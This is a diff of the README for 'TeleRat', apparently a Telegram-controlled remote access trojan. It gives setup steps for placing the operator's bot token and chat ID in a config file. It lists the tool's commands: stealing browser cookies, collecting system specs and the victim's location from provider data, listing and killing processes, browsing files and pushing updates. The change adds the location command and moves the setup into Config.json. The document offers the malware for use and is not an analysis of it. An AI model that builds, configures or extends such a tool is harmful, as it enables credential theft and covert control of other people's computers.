@@ -5,9 +5,9 @@ It's not a final version of programm and i gonna support it.
 Now programm doesn't has a autorun and guard system.
 
 Usage:
-1. Open a TeleRat.sln
-2. Change token in config.cs on your bot's token.
-3. Change Chat_ID on your chat id in config.cs.
+1. Change token in Config.json (bin/Debug/Config.json) on your bot's token.
+2. Change Chat_ID in Config.json (bin/Debug/Config.json) on your chat id.
+3. Open telerat.sln.
 4. Compile it and use.<br>
 <br>
 Commands:<br>
@@ -18,6 +18,7 @@ Commands:<br>
 /GetCookieFile - get cookies from browsers<br>
 /GetSystem - get system specs<br>
 /GetProcess - get tasklist<br>
+/GetProviderData - get provider data (city, region, country etc)
 /KillProcess|process name - kill process<br>
 /ls|path - get files and folders in path<br>
 To upload update you need to attach update with caption "/UploadUpdate"<br>
